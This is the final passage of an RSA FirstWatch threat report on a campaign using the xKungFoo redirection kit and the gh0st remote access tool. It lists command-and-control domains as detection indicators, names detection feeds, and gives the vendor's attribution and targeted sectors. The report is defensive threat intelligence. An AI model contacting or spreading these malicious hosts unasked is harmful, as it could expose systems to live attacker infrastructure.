=\n\nwww.wsdhealthy.com,usc-data.suroot.com,usa-mail.scieron.com,dll.freshdns.org\n\nAdditionally, the following feeds and parsers from RSA NetWitness Live service can be used for\n\nadditional Gh0st RAT detection.\n\nGh0st parser\n\nAPT-domains feed\n\nAPT-IPs feed\n\n#### Conclusions\n\nRSA FirstWatch research has revealed an exploit and compromise campaign with connections\n\nover the past 8 months. The collected data suggests that this attack was orchestrated and\n\ncarried out by threat actors commonly referred to in the industry as “APT”:\n\n1) Use of the “xKungFoo” script kit for victim redirection\n2) Use of attack methodology that matches motives seen in past APT attacks – most\nnotably such as those seen in the Aurora and GhostNet campaigns\n3) Use of the “gh0st” remote access tool (RAT) in this and previous campaigns\n4) Use of command and control infrastructure in the Hong Kong area in this and previous\ncampaigns\n5) Gross impact and on almost 900 unique organizations\n6) Targets of Interest and Opportunity being geographically disperse in addition to\nindustrial & vertical diverse with a heavy concentration in the following areas:\n\n     - International finance & banking\n\n     - Technology\n\n     - Government – municipal, state, federal and international\n\n     - Utilities & energy\n\n     - Educational\n\n     - Defense Industrial Base (DIB)\n\n     - Corporate Enterprise\n\nThe possibility exists that this was intentional misdirection on the part of the attackers in\n\nregards to their origin. However, the RSA FirstWatch team believes the data supports our\n\nanalysis and this is further evidence of APT intrusion into United States government and\n\ncorporate assets.\n\n\n-----\n\n#### Disclaimer\n\nRSA Security LLC (“RSA”) believes the information in this publication is accurate as of\n\nits publication date.
